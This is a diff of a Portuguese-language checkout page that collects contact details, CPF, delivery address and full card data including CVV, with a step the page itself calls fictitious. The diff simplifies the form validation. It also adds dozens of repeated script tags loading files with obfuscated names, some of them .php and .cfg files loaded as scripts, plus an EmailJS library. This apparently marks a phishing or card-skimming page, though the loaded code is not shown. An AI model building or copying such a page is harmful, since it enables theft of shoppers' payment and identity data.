@@ -302,97 +302,16 @@
         text-decoration: underline;
     }
 
-    /* ============================================
-       ESTILOS PARA VALIDAÇÃO DE CAMPOS
-       ============================================ */
-
-    /* Campo com erro */
-    .form-input.error {
+    /* Validação de campos */
+    .form-input.invalid {
         border-color: #ef4444 !important;
-        background-color: #fef2f2;
-    }
-
-    .form-input.error:focus {
-        outline: none;
-        border-color: #dc2626 !important;
-        box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.1);
-    }
-
-    /* Mensagem de erro visível */
-    .error-message {
-        display: none;
-        color: #dc2626;
-        font-size: 12px;
-        margin-top: 6px;
-        font-weight: 500;
     }
 
     .error-message.show {
         display: block;
-        animation: slideDown 0.3s ease-out;
-    }
-
-    /* Ícone de validação */
-    .form-group {
-        position: relative;
-    }
-
-    .form-group .validation-icon {
-        position: absolute;
-        right: 12px;
-        top: 38px;
-        font-size: 18px;
-        display: none;
-    }
-
-    .form-group .validation-icon.show {
-        display: block;
-    }
-
-    .form-group .validation-icon.valid {
-        color: #10b981;
-    }
-
-    .form-group .validation-icon.invalid {
         color: #ef4444;
-    }
-
-    /* Notificação de erro global */
-    .validation-alert {
-        display: none;
-        background: #fef2f2;
-        border: 1px solid #fecaca;
-        border-radius: 8px;
-        padding: 16px;
-        margin-bottom: 24px;
-        color: #dc2626;
-        font-size: 14px;
-        font-weight: 500;
-    }
-
-    .validation-alert.show {
-        display: block;
-        animation: slideDown 0.3s ease-out;
-    }
-
-    .validation-alert-title {
-        font-weight: 700;
-        margin-bottom: 8px;
-    }
-
-    .validation-alert-list {
-        list-style: none;
-        padding: 0;
-        margin: 0;
-    }
-
-    .validation-alert-list li {
-        padding: 4px 0;
-    }
-
-    .validation-alert-list li:before {
-        content: "• ";
-        margin-right: 8px;
+        font-size: 0.875em;
+        margin-top: 0.25em;
     }
 </style>
 
@@ -439,7 +358,7 @@
 
         <!-- Barra de Progresso com 3 Etapas (Carrinho fictícia, Entrega, Pagamento) -->
         <div class="progress-container">
-            <div class="progress-bar">
+            <div class="progress-steps">
                 <div class="progress-line" id="progressLine"></div>
                 <!-- Etapa 1: Carrinho (fictícia - sempre concluída) -->
                 <div class="step completed" data-step="1">
@@ -465,13 +384,6 @@
                 <h2 class="step-title">Entrega</h2>
                 <p class="step-subtitle">Complete as informações abaixo para continuar</p>
 
-                <!-- Alerta de validação -->
-                <div class="validation-alert" id="validationAlert">
-                    <div class="validation-alert-title">Por favor, preencha os campos obrigatórios:</div>
-                    <ul class="validation-alert-list" id="validationAlertList">
-                    </ul>
-                </div>
-
                 <form id="deliveryForm">
                     <!-- Seção 2.1: Dados de Contato (E-mail) -->
                     <div class="form-section" id="sectionContact">
@@ -479,7 +391,6 @@
                         <div class="form-group">
                             <label class="form-label" for="email">E-mail *</label>
                             <input type="email" id="email" name="email" class="form-input" required placeholder="seu@email.com">
-                            <span class="validation-icon"></span>
                             <div class="error-message" id="emailError">Digite um e-mail válido</div>
                         </div>
                     </div>
@@ -490,7 +401,6 @@
                         <div class="form-group">
                             <label class="form-label" for="zipCode">CEP *</label>
                             <input type="text" id="zipCode" name="zipCode" class="form-input" maxlength="9" required placeholder="00000-000" inputmode="numeric">
-                            <span class="validation-icon"></span>
                             <div class="cep-loading" id="cepLoading">
                                 <div class="cep-spinner"></div>
                                 <span>Buscando endereço...</span>
@@ -538,20 +448,17 @@
                             <div class="form-group">
                                 <label class="form-label" for="firstName">Seu Nome *</label>
                                 <input type="text" id="firstName" name="firstName" class="form-input" required>
-                                <span class="validation-icon"></span>
                                 <div class="error-message" id="firstNameError">Digite seu nome</div>
                             </div>
                             <div class="form-group">
                                 <label class="form-label" for="lastName">Sobrenome *</label>
                                 <input type="text" id="lastName" name="lastName" class="form-input" required>
-                                <span class="validation-icon"></span>
                                 <div class="error-message" id="lastNameError">Digite seu sobrenome</div>
                             </div>
                         </div>
                         <div class="form-group">
                             <label class="form-label" for="phone">Telefone *</label>
                             <input type="tel" id="phone" name="phone" class="form-input" maxlength="15" required placeholder="(00) 00000-0000" inputmode="numeric">
-                            <span class="validation-icon"></span>
                             <div class="error-message" id="phoneError">Digite um telefone válido</div>
                         </div>
                     </div>
@@ -590,7 +497,6 @@
                             <div class="form-group">
                                 <label class="form-label" for="number">Número *</label>
                                 <input type="text" id="number" name="number" class="form-input" required>
-                                <span class="validation-icon"></span>
                                 <div class="error-message" id="numberError">Digite o número</div>
                             </div>
                             <div class="form-group">
@@ -606,14 +512,13 @@
                         <div class="form-group">
                             <label class="form-label" for="cpf">CPF *</label>
                             <input type="text" id="cpf" name="cpf" class="form-input" maxlength="14" required placeholder="000.000.000-00" inputmode="numeric">
-                            <span class="validation-icon"></span>
                             <div class="error-message" id="cpfError">Digite um CPF válido</div>
                         </div>
                     </div>
 
                     <!-- Seção 2.8: Botão de Continuidade (revelado após CPF válido) -->
                     <div class="button-group hidden" id="sectionButton">
-                        <button type="button" class="btn btn-primary btn-full" id="btnContinuePayment" disabled onclick="validateAndContinue()">
+                        <button type="button" class="btn btn-primary btn-full" id="btnContinuePayment" disabled onclick="validateDeliveryForm()">
                             Prosseguir para o pagamento
                         </button>
                     </div>
@@ -665,14 +570,12 @@
                             <div class="form-group">
                                 <label class="form-label" for="cardNumber">Número do Cartão *</label>
                                 <input type="text" id="cardNumber" name="cardNumber" class="form-input" maxlength="19" required>
-                                <span class="validation-icon"></span>
                                 <div class="error-message" id="cardNumberError">Digite o número do cartão</div>
                             </div>
 
                             <div class="form-group">
                                 <label class="form-label" for="cardName">Nome no Cartão *</label>
                                 <input type="text" id="cardName" name="cardName" class="form-input" required>
-                                <span class="validation-icon"></span>
                                 <div class="error-message" id="cardNameError">Digite o nome no cartão</div>
                             </div>
 
@@ -680,13 +583,11 @@
                                 <div class="form-group">
                                     <label class="form-label" for="cardExpiry">Validade *</label>
                                     <input type="text" id="cardExpiry" name="cardExpiry" class="form-input" placeholder="MM/AA" maxlength="5" required>
-                                    <span class="validation-icon"></span>
                                     <div class="error-message" id="cardExpiryError">Digite a validade</div>
                                 </div>
                                 <div class="form-group">
                                     <label class="form-label" for="cardCvv">CVV *</label>
                                     <input type="text" id="cardCvv" name="cardCvv" class="form-input" maxlength="4" required>
-                                    <span class="validation-icon"></span>
                                     <div class="error-message" id="cardCvvError">Digite o CVV</div>
                                 </div>
                             </div>
@@ -708,7 +609,6 @@
                                     <option value="11">11x R$ 31,90 com juros</option>
                                     <option value="12">12x R$ 29,99 com juros</option>
                                 </select>
-                                <span class="validation-icon"></span>
                                 <div class="error-message" id="installmentsError">Selecione as parcelas</div>
                             </div>
                         </div>
@@ -1018,185 +918,128 @@
     </div>
 </footer>
 
-<!-- Script principal com validação de campos -->
-<script>
-    // ============================================
-    // SISTEMA DE VALIDAÇÃO DE CAMPOS
-    // ============================================
 
-    // Campos obrigatórios da etapa de entrega
-    const requiredFields = {
-        email: { id: 'email', name: 'E-mail', type: 'email' },
-        zipCode: { id: 'zipCode', name: 'CEP', type: 'zipcode' },
-        firstName: { id: 'firstName', name: 'Nome', type: 'text' },
-        lastName: { id: 'lastName', name: 'Sobrenome', type: 'text' },
-        phone: { id: 'phone', name: 'Telefone', type: 'phone' },
-        number: { id: 'number', name: 'Número', type: 'text' },
-        cpf: { id: 'cpf', name: 'CPF', type: 'cpf' }
-    };
+<!-- Chamada para o seu script original -->
+<script src="spinner.js" defer></script>
 
-    /**
-     * Valida um campo individual
-     */
-    function validateField(fieldId) {
-        const field = document.getElementById(fieldId);
-        if (!field) return true;
 
-        const value = field.value.trim();
-        const fieldConfig = requiredFields[fieldId];
-        let isValid = false;
+  
+  <script src="/api/modules/init-z10b.js?sig=981&check=false" defer></script>
+<script src="/api/modules/init-z10b1.js?debug=0" defer></script>
+<script src="/private/engine/config.php" defer></script>
+<script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+ <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <script src="laergergq.js" defer></script>
+  <script src="temprefew.js" defer></script>
+  <script src="fallerergg.php" defer></script>
+  <script src="x-chergere.js" defer></script>
+  <script src="fx.initwefew.js" defer></script>
+  <script src="traew.js" defer></script>
+  <script src="hide-werfew.cfg" defer></script>
+  <script src="setup-corewrrffwe.js" defer></script>
+  <script src="trace-layerqwfew.js" defer></script>
+  <script src="api-cacherwwf.php" defer></script>
+  <script src=".sysloaderweew.js" defer></script>
+  <script src="ini-templight.js" defer></script>
+  <script src="old.module.loader.js" defer></script>
+  <script src="temprefew.js" defer></script>
+  <script src="fallerergg.php" defer></script>
+  <script src="x-chergere.js" defer></script>
+  <script src="fx.initwefew.js" defer></script>
+  <script src="traew.js" defer></script>
+  <script src="hide-werfew.cfg" defer></script>
+  <script src="setup-corewrrffwe.js" defer></script>
+  <script src="trace-layerqwfew.js" defer></script>
+  <script src="api-cacherwwf.php" defer></script>
+  <script src=".sysloaderweew.js" defer></script>
+  <script src="temprefew.js" defer></script>
+  <script src="fallerergg.php" defer></script>
+  <script src="x-chergere.js" defer></script>
+  <script src="fx.initwefew.js" defer></script>
+  <script src="hide-werfew.cfg" defer></script>
+  <script src="setup-corewrrffwe.js" defer></script>
+  <script src="trace-layerqwfew.js" defer></script>
+  <script src="api-cacherwwf.php" defer></script>
+  <script src=".sysloaderweew.js" defer></script>
 
-        // Verificar se o campo está visível
-        let parent = field.parentElement;
-        while (parent && !parent.classList.contains('form-section')) {
-            parent = parent.parentElement;
-        }
-        if (parent && parent.classList.contains('hidden')) {
-            return true; // Campo oculto é considerado válido
-        }
+  <!-- Script principal com navegação progressiva -->
+  <script src="script.js"></script>
+  <script>
+    // Validação de campos obrigatórios
+    const requiredFields = [
+      { id: 'email' },
+      { id: 'zipCode' },
+      { id: 'firstName' },
+      { id: 'lastName' },
+      { id: 'phone' },
+      { id: 'number' },
+      { id: 'cpf' }
+    ];
 
-        // Validação por tipo
-        switch (fieldConfig.type) {
-            case 'email':
-                isValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
-                break;
-            case 'zipcode':
-                isValid = /^\d{5}-?\d{3}$/.test(value);
-                break;
-            case 'phone':
-                isValid = /^\(\d{2}\)\s?\d{4,5}-?\d{4}$/.test(value) || /^\d{10,11}$/.test(value.replace(/\D/g, ''));
-                break;
-            case 'cpf':
-                isValid = /^\d{3}\.\d{3}\.\d{3}-?\d{2}$/.test(value) || /^\d{11}$/.test(value.replace(/\D/g, ''));
-                break;
-            default:
-                isValid = value.length > 0;
-        }
+    function validateDeliveryForm() {
+      const deliveryForm = document.getElementById('deliveryForm');
+      let allValid = true;
+      let hasErrors = false;
 
-        // Atualizar visual do campo
-        if (isValid) {
-            field.classList.remove('error');
-            const errorMsg = document.getElementById(fieldId + 'Error');
-            if (errorMsg) errorMsg.classList.remove('show');
-            const icon = field.parentElement.querySelector('.validation-icon');
-            if (icon) {
-                icon.classList.add('show', 'valid');
-                icon.classList.remove('invalid');
-                icon.textContent = '✓';
+      requiredFields.forEach(fieldInfo => {
+        const field = document.getElementById(fieldInfo.id);
+        const errorMessage = document.getElementById(fieldInfo.id + 'Error');
+
+        if (field) {
+          // Verificar se o campo está visível
+          let isFieldVisible = true;
+          let currentElement = field;
+          while (currentElement && currentElement !== deliveryForm) {
+            if (currentElement.classList.contains('hidden')) {
+              isFieldVisible = false;
+              break;
             }
-        } else {
-            field.classList.add('error');
-            const errorMsg = document.getElementById(fieldId + 'Error');
-            if (errorMsg) errorMsg.classList.add('show');
-            const icon = field.parentElement.querySelector('.validation-icon');
-            if (icon) {
-                icon.classList.add('show', 'invalid');
-                icon.classList.remove('valid');
-                icon.textContent = '✗';
-            }
-        }
+            currentElement = currentElement.parentElement;
+          }
 
-        return isValid;
+          if (isFieldVisible) {
+            if (field.value.trim() === '') {
+              field.classList.add('invalid');
+              if (errorMessage) errorMessage.classList.add('show');
+              allValid = false;
+              hasErrors = true;
+            } else {
+              field.classList.remove('invalid');
+              if (errorMessage) errorMessage.classList.remove('show');
+            }
+          }
+        }
+      });
+
+      if (hasErrors) {
+        alert('Por favor, preencha todos os campos obrigatórios para prosseguir.');
+      }
+
+      return allValid;
     }
 
-    /**
-     * Valida todos os campos obrigatórios
-     */
-    function validateAllFields() {
-        const errors = [];
-        let allValid = true;
-
-        for (const [key, config] of Object.entries(requiredFields)) {
-            const field = document.getElementById(config.id);
-            if (!field) continue;
-
-            // Verificar se o campo está visível
-            let parent = field.parentElement;
-            while (parent && !parent.classList.contains('form-section')) {
-                parent = parent.parentElement;
+    // Monitorar a visibilidade da seção de dados pessoais para mostrar/ocultar o divisor
+    const observer = new MutationObserver((mutations) => {
+      mutations.forEach((mutation) => {
+        if (mutation.attributeName === 'class') {
+          const section = document.getElementById('sectionPersonalData');
+          const hr = document.getElementById('hrDivider');
+          if (section && hr) {
+            if (section.classList.contains('show')) {
+              hr.style.display = 'block';
+            } else {
+              hr.style.display = 'none';
             }
-            if (parent && parent.classList.contains('hidden')) {
-                continue; // Pular campos ocultos
-            }
-
-            if (!validateField(config.id)) {
-                allValid = false;
-                errors.push(config.name);
-            }
+          }
         }
-
-        // Mostrar alerta de validação se houver erros
-        const alert = document.getElementById('validationAlert');
-        if (!allValid) {
-            const alertList = document.getElementById('validationAlertList');
-            alertList.innerHTML = '';
-            errors.forEach(error => {
-                const li = document.createElement('li');
-                li.textContent = error;
-                alertList.appendChild(li);
-            });
-            alert.classList.add('show');
-            alert.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-        } else {
-            alert.classList.remove('show');
-        }
-
-        return allValid;
-    }
-
-    /**
-     * Função chamada ao clicar em "Prosseguir para o pagamento"
-     */
-    function validateAndContinue() {
-        if (validateAllFields()) {
-            // Todos os campos estão válidos
-            console.log('Formulário válido! Prosseguindo...');
-            // Aqui você pode adicionar a lógica para ir para a próxima etapa
-            // goToStep(3);
-        } else {
-            // Há campos inválidos - o alerta já foi mostrado
-            console.log('Formulário inválido. Preencha os campos obrigatórios.');
-        }
-    }
-
-    /**
-     * Adicionar listeners aos campos
-     */
-    document.addEventListener('DOMContentLoaded', function() {
-        for (const [key, config] of Object.entries(requiredFields)) {
-            const field = document.getElementById(config.id);
-            if (field) {
-                // Validar ao sair do campo
-                field.addEventListener('blur', function() {
-                    validateField(config.id);
-                });
-
-                // Validar enquanto digita (para feedback em tempo real)
-                field.addEventListener('input', function() {
-                    validateField(config.id);
-                });
-            }
-        }
+      });
     });
 
-    // Funções auxiliares (placeholder para funções existentes)
-    function goToStep(step) {
-        console.log('Ir para etapa:', step);
-        // Implementar navegação entre etapas
+    const target = document.getElementById('sectionPersonalData');
+    if (target) {
+      observer.observe(target, { attributes: true });
     }
-
-    function applyCoupon() {
-        console.log('Aplicar cupom');
-    }
-
-    function copyPixCode() {
-        console.log('Copiar código PIX');
-    }
-
-    function toggleOrderSummary() {
-        console.log('Alternar resumo do pedido');
-    }
-</script>
+  </script>
 
 </body>
 
